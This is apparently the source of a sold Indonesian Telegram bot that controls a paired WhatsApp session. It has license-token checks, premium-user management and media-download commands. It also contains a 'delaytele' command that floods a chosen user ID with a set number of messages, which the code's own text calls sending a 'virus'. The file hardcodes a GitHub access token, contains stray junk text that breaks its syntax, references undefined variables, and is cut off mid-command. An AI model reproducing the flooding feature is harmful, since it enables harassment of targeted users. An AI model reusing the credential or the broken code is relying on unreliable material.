const { Telegraf, Markup, session } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const yts = require("yt-search")
const httpMod = require('http')
const httpsMod = require('https')
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }hshshusjsjsh
  });
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  quetedMessage,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })
 

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

 const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/makloampas/Lixxkece/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens; // ambil dari object 'tokens'
    } else {
      console.error(chalk.red("❌ Format data di GitHub salah! Key 'tokens' harus array"));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("LU SIAPA NGENTOT!!!\nTOKEN LU GAK ADA DI DATABASE:", error.message));
    return [];
  }
}

// Validasi token
async function validateToken() {
  console.log(chalk.yellow("⏳ Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.includes(tokenBot)) {
    console.log(chalk.red("❌ LU SIAPA NGENTOD TOKEN LU GAK ADA DI DATABASE!!!"));
    process.exit(1);
  }

  console.log(chalk.green("✅ Token Anda Terhubung ke database!!"));
  startBot();
}

// Fungsi startBot kalau token valid
function startBot() {
  console.log(chalk.red(`


Name    : Lixx
Version : GEN 1
`));
}

validateToken();



const thumbnailUrl = "https://h.top4top.io/m_36881anl31.mp4";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.blue(`
⠀⠀⠀⠀
GXION SVIP BERHASIL TERSAMBUNG
 TERIMAKASIH TELAH MEMBELI 

╭━━ 🔒 ONLINE BOT✅ ━━╮
│ 
│ THANKS BUY THIS SCRIPT 🔥
│ ▰▰▰▰▰▰▰▰▰▰▰▰
╰━━━━━━━━━━━━━━━━╯
 DEVELOPER: @Lixxisheree2
 
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.blue(`
⠀⠀⠀
GXION SVIP BERHASIL TERSAMBUNG✅
 TERIMAKASIH TELAH MEMBELI 

  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234LIXX");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡</pre></blockquote>`;

    const sentMsg = await ctx.replyWithVideo(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡</pre></blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

// ====== GITHUB CONFIG (ISI SENDIRI) ======
const GITHUB_TOKEN  = "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";     // contoh: "ghp_xxxxxx"
const GITHUB_OWNER  = "makloampas";     // username github
const GITHUB_REPO   = "Pullupdate";     // nama repo
const GITHUB_BRANCH = "main"; // "main" / "master"

// ====== fetch helper ======
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

function must(val, name) {
  if (!val) throw new Error(`${name} masih kosong! Isi dulu di index.js`);
  return val;
}

// ====== GitHub: cek isi repo root ======
async function ghListRootContents() {
  must(GITHUB_TOKEN, "GITHUB_TOKEN");
  must(GITHUB_OWNER, "GITHUB_OWNER");
  must(GITHUB_REPO, "GITHUB_REPO");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(GITHUB_REPO)}` +
    `/contents?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, {
    headers: {
      Authorization: `token ${GITHUB_TOKEN}`,
      Accept: "application/vnd.github+json",
      "User-Agent": "telegraf-update-bot",
    },
  });

  // repo kosong biasanya 404 di /contents
  if (res.status === 404) return [];

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub API error ${res.status}: ${txt || res.statusText}`);
  }

  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});

// ====== /update ======
bot.command("update", async (ctx) => {
  try {
    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Panel akan di restart, tunggu proses 1–3 menit...");

    const items = await ghListRootContents();

    if (!items.length) {
      return ctx.reply("📁 Repo ini kosong. Tunggu owner menambah file terlebih dahulu.");
    }

    const names = items
      .filter((x) => x && (x.type === "file" || x.type === "dir"))
      .map((x) => x.name);

    await ctx.reply(`✅ Ditemukan name file:\n${names.map(n => `- ${n}`).join("\n")}`);

    // kirim status ke grup utama (optional)
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          `🟣 *Status Panel:*\n🔄 Update dimulai...\n✅ Ditemukan file:\n${names.map(n => `• ${n}`).join("\n")}\n♻️ Panel akan restart...`,
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}

    await ctx.reply("✅ Auto update sudah berhasil.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 5000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

bot.command("chatowner", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length === 0) {
    return ctx.reply("⚠️ Format: /chatowner <pesan>");
  }

  const pesan = args.join(" ");
  const user = ctx.from;

  try {
    // Teruskan pesan user ke developer
    await bot.telegram.sendMessage(
      DEVELOPER_ID,
      `📩 Pesan baru dari *${user.first_name}* (ID: \`${user.id}\`):\n\n${pesan}`,
      { parse_mode: "Markdown" }
    );

    await ctx.reply("✅ Pesanmu sudah dikirim ke developer, harap tunggu balasan.");
  } catch (e) {
    console.error("Error in /dev:", e);
    ctx.reply("❌ Gagal mengirim pesan ke developer.");
  }
});

// Hanya developer bisa balas ke user
bot.command("balas", async (ctx) => {
  if (ctx.from.id.toString() !== DEVELOPER_ID) {
    return ctx.reply("❌ Command ini hanya untuk developer!");
  }

  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 2) {
    return ctx.reply("⚠️ Format: /reply <userId> <pesan>");
  }

  const targetId = args[0];
  const pesan = args.slice(1).join(" ");

  try {
    await bot.telegram.sendMessage(
      targetId,
      `💬 Balasan dari Developer:\n\n${pesan}`
    );

    await ctx.reply(`✅ Pesan berhasil dikirim ke user \`${targetId}\``, {
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error("Error in /reply:", e);
    ctx.reply("❌ Gagal mengirim balasan ke user.");
  }
});

bot.command('xnxx', async (ctx) => {
    const title = ctx.message.text.split(' ').slice(1).join(' ');
    if (!title) return ctx.reply('✏️ Masukkan judul:\nContoh: /xnxx Lari ada wibu');

    const reply = ctx.message.reply_to_message;
    if (!reply || !reply.photo) {
      return ctx.reply('📸 Balas perintah ini dengan sebuah foto!\nContoh:\n1. Kirim foto\n2. Reply dengan: /xnxx Judulnya');
    }

    try {
      const photo = reply.photo[reply.photo.length - 1]; // resolusi terbesar
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);

      const imageBuffer = (await axios.get(fileLink.href, { responseType: 'arraybuffer' })).data;

      const form = new FormData();
      form.append('title', title);
      form.append('image', imageBuffer, {
        filename: 'image.jpg',
        contentType: 'image/jpeg',
      });

      const apiRes = await axios.post('https://api.siputzx.my.id/api/canvas/xnxx', form, {
        headers: form.getHeaders(),
        responseType: 'arraybuffer',
      });

      await ctx.replyWithPhoto({ source: Buffer.from(apiRes.data) });
    } catch (err) {
      console.error(err);
      ctx.reply('❌ Gagal membuat gambar XNXX. Coba lagi nanti.');
    }
});

bot.command("tiktok", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" "); // ambil link setelah /tiktok
  const url = args.trim();

  if (!url || !/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i.test(url)) {
    return ctx.reply("❌ Format link TikTok tidak valid.", { parse_mode: "Markdown" });
  }

  try {
    const processing = await ctx.reply("⏳ Mengunduh video TikTok...");

    const params = new URLSearchParams();
    params.set("url", url);
    params.set("hd", "1");

    const res = await fetch("https://tikwm.com/api/", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params
    });

    const data = await res.json();

    await ctx.deleteMessage(processing.message_id).catch(() => {});

    if (!data?.data?.play) {
      return ctx.reply("❌ Video tidak ditemukan.");
    }

    // Kirim video TikTok
    await ctx.replyWithVideo(
      { url: data.data.play },
      {
        caption: `🎵 ${data.data.title || "Video TikTok"}\n🔗 ${url}`,
        supports_streaming: true
      }
    );

    // Kirim audio jika ada
    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error saat download TikTok.");
  }
});

bot.command("ig", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" ").trim();
  const url = args;

  if (!url) {
    return ctx.reply(
      "❌ Format salah!\n\nGunakan `/ig <link Instagram>`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const apiUrl = `https://api.diioffc.web.id/api/download/instagram?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(apiUrl);

    if (!data || !data.result) {
      return ctx.reply("❌ Tidak ada media ditemukan.");
    }

    // Ubah ke array agar bisa di-loop meskipun hanya satu media
    const mediaList = Array.isArray(data.result) ? data.result : [data.result];

    for (const media of mediaList) {
      if (media.url.includes(".mp4")) {
        await ctx.replyWithVideo(
          { url: media.url },
          { caption: "📥 Instagram Video" }
        );
      } else {
        await ctx.replyWithPhoto(
          { url: media.url },
          { caption: "📥 Instagram Photo" }
        );
      }
    }
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Error saat mengambil media IG.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!text) {
    return ctx.reply(
      "❌ Missing input. Please provide a text.\n\nExample:\n/brat Hallo All"
    );
  }

  const apiUrl = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}`;

  try {
    await ctx.replyWithPhoto(
      { url: apiUrl },
      {
        caption: `🖼️ *Brat Image Generated*\n\n✏️ Text: *${text}*`,
        parse_mode: "Markdown"
      }
    );
  } catch (err) {
    console.error("Brat API Error:", err);
    ctx.reply("❌ Error generating Brat image. Please try again later.");
  }
});

// Command /getcode <url>
bot.command("getcode", async (ctx) => {
  const senderId = ctx.from.id;
  const chatId = ctx.chat.id;

  // Ambil argumen URL
  const inputText = ctx.message.text.split(" ").slice(1).join(" ");
  const url = (inputText || "").trim();

  if (!/^https?:\/\//i.test(url)) {
    return ctx.reply("♥️ Gunakan format:\n/getcode https://namaweb");
  }

  try {
    // Ambil source HTML dari URL
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000,
    });

    const htmlContent = response.data;
    const filePath = path.join(__dirname, "web_source.html");

    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await ctx.replyWithDocument({ source: filePath }, { caption: `✅ CODE DARI ${url}` });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    ctx.reply("♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.command("cekprofil", async (ctx) => {
  const user = ctx.from;

  const info = `
🪪 <b>Data Profil Kamu</b>
━━━━━━━━━━━━━━━━━━
👤 Nama: ${user.first_name || "-"} ${user.last_name || ""}
🏷 Username: @${user.username || "Tidak ada"}
🆔 ID: <code>${user.id}</code>
🌐 Bahasa: ${user.language_code || "unknown"}
`;

  await ctx.reply(info, { parse_mode: "HTML" });
});

bot.command("delaytele", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = ctx.from.id;

  if (args.length < 3) {
    return ctx.reply("❌ Format salah!\n\nGunakan:\n/delaytele id jumlah");
  }

  const targetId = args[1];
  const jumlah = parseInt(args[2]);

  // 🚫 PROTECT ID TERTENTU
  if (protectedIds.includes(targetId)) {
    return ctx.reply("❌ Akses terlarang! Kamu tidak bisa mengirim virus ke user ini😂");
  }

  if (isNaN(targetId)) {
    return ctx.reply("❌ ID tidak valid!");
  }

  if (isNaN(jumlah) || jumlah <= 0) {
    return ctx.reply("❌ Jumlah pesan harus angka & lebih dari 0!");
  }

